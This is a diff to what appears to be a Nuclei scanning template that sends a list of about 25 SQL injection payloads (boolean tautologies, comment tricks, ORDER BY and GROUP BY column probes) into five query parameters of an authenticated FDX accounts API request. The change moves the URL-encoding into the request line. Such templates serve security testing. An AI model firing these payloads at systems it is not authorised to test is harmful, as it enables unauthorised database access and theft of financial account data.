@@ -14,37 +14,37 @@ info:
 requests:
   - raw:
       - |
-        GET /fdx/v4/accounts?accountIds=§sqli§&startTime=§sqli§&endTime=§sqli§&resultType=lightweight&offset=§sqli§&limit=§sqli§ HTTP/1.1
+        GET /fdx/v4/accounts?accountIds={{url_encode(§sqli§)}}&startTime={{url_encode(§sqli§)}}&endTime={{url_encode(§sqli§)}}&resultType=lightweight&offset={{url_encode(§sqli§)}}&limit={{url_encode(§sqli§)}} HTTP/1.1
         Host: {{Hostname}}
         Authorization: Bearer {{JWT}} 
         Connection: keep-alive
     payloads:
       sqli:
-         - {{url_encode(" 1 or 1")}}
-         - {{url_encode(" %22%22|0;#")}}
-         - {{url_encode(" ''")}}
-         - {{url_encode(" ' or#")}}
-         - {{url_encode(" ' OR '1")}}
-         - {{url_encode(" ' OR 1 -- -")}}
-         - {{url_encode(" %22 OR 1 = 1 -- -#")}}
-         - {{url_encode(" %22%22|0;#")}}
-         - {{url_encode(" OR 1=1")}}
-         - {{url_encode(" AND 1")}}
-         - {{url_encode(" AND 0")}}
-         - {{url_encode(" AND true")}}
-         - {{url_encode(" AND false")}}
-         - {{url_encode(" 1-false")}}
-         - {{url_encode(" 1-true")}}
-         - {{url_encode(" 1*56")}}
-         - {{url_encode(" -2")}}
-         - {{url_encode(" 1' ORDER BY 1--+")}}
-         - {{url_encode(" 1' ORDER BY 2--+")}}
-         - {{url_encode(" 1' ORDER BY 3--+")}}
-         - {{url_encode(" 1' ORDER BY 1,2--+")}}
-         - {{url_encode(" 1' ORDER BY 1,2,3--+")}}
-         - {{url_encode(" 1' GROUP BY 1,2,--+")}}
-         - {{url_encode(" 1' GROUP BY 1,2,3--+")}}
-         - {{url_encode(" ' GROUP BY columnnames having 1=1 --")}}
+         - " 1 or 1"
+         - " %22%22|0;#"
+         - " ''"
+         - " ' or#"
+         - " ' OR '1"
+         - " ' OR 1 -- -"
+         - " %22 OR 1 = 1 -- -#"
+         - " %22%22|0;#"
+         - " OR 1=1"
+         - " AND 1"
+         - " AND 0"
+         - " AND true"
+         - " AND false"
+         - " 1-false"
+         - " 1-true"
+         - " 1*56"
+         - " -2"
+         - " 1' ORDER BY 1--+"
+         - " 1' ORDER BY 2--+"
+         - " 1' ORDER BY 3--+"
+         - " 1' ORDER BY 1,2--+"
+         - " 1' ORDER BY 1,2,3--+"
+         - " 1' GROUP BY 1,2,--+"
+         - " 1' GROUP BY 1,2,3--+"
+         - " ' GROUP BY columnnames having 1=1 --"
     attack: batteringram
 
     extractors:
